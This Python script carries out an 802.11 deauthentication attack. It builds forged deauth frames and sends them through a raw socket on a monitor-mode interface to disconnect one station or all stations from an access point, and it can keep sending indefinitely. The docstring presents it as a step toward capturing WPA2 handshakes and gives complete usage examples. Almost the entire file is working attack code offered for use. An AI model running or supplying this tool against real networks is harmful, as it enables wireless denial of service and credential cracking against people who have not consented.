'''
Script to launch an IEEE 802.11 Deauthentication attack. Can be used as the precursor to capture WAP2 handshake.
Uses the structures defined in /Structures/80211/RadioTap (for radiotap headers) and /Structures/80211/Management (for Deauthentication frames)

Arguments are expected as:
number: The number of deauths sent to each station (in multiples of 64)
-a: MAC address of Acess Point
-c: MAC address of station
iface: The monitor mode interface

If no count is specified, and infinite number of deauths are sent
If -c is ignored, an undirected Deauth is made, sending deauthentication frames to the broadcast MAC. All stations are Deauth-ed
If -a or iface is ignored, the script fails

Notes:
->Does not wait for ACKs
->Sends 64 frames to both the Station and the AP in each Deauth in case of a directed Deauth
->Requires a monitor mode interface
->Requires Root/Admin

With great power comes great responsibility. Use wisely.

Example usage:
(Complete Usage)
root@localhost:~#python Deauth.py 10 -a ff:ff:ff:ff:ff:ff -c ff:ff:ff:ff:ff:ff ath0 

(No count, infinite deauths)
root@localhost:~#python Deauth.py -a ff:ff:ff:ff:ff:ff -c ff:ff:ff:ff:ff:ff ath0 

(No client station, deauths sent to broadcast)
root@localhost:~#python Deauth.py 10 -a ff:ff:ff:ff:ff:ff ath0 
'''
import sys, socket, time
sys.path.append( <absolute path to /Structures> )
from WLAN import RadioTap
from WLAN.Management import DeauthFrame

#Parsing and preparing the command line arguments
n=0
STA_MAC='ff:ff:ff:ff:ff:ff'
directed=False

if sys.argv[1] != '-a':
    n=int(sys.argv[1])
    AP_MAC=sys.argv[3]
    if sys.argv[4] == '-c':
        STA_MAC=sys.argv[5]
        directed=True
        iface=sys.argv[6]
    else:
        iface=sys.argv[4]
else:
    AP_MAC=sys.argv[2]
    if sys.argv[3] == '-c':
        STA_MAC=sys.argv[4]
        directed=True
        iface=sys.argv[5]
    else:
        iface=sys.argv[3]

def make(base):
    base=base.split(':')
    d=''
    for item in base:
        d+=chr(int(item,16))
    return d

AP_MAC=make(AP_MAC)    #BSSID is the same
STA_MAC=make(STA_MAC)

#Building the Radio Tap Header
Radio=RadioTap().Header()

#Creating the socket interface
sock=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0003))
sock.bind((iface,socket.ntohs(0x0003)))

#Sending Deauths

#Directed Deauth
if directed:
    #Build two packets, STA->AP and AP->STA

    DAuthSTA=DeauthFrame(AP_MAC,STA_MAC,AP_MAC).Deauth()    #AP(Source)->STA(Destination) 
    TO_STA=Radio+DAuthSTA

    DAuthAP=DeauthFrame(STA_MAC,AP_MAC,AP_MAC).Deauth()    #STA(Source)->AP(Destination) 
    TO_AP=Radio+DAuthAP

    #Count not specified, indefinite Deauth 
    if n == 0:
        while 1:
            for i in range(0,64):
                sock.send(TO_AP)    #Send Packets to AP
                sock.send(TO_STA)    #Send Packets to STA
    #Count Specified
    else:
        while n>0:
            for i in range(0,64):
                sock.send(TO_AP)    #Send Packets to AP
                sock.send(TO_STA)    #Send Packets to STA
            n-=1
#Undirected
else:
    DAuthSTA=DeauthFrame(AP_MAC,STA_MAC,AP_MAC).Deauth()    #AP(Source)->STA(Destination) 
    TO_STA=Radio+DAuthSTA

    #Count not specified, indefinite Deauth 
    if n == 0:
        while 1:
            for i in range(0,64):
                sock.send(TO_STA)
    #Count Specified
    else:
        while n>0:
            for i in range(0,64):
                sock.send(TO_STA)
            n-=1


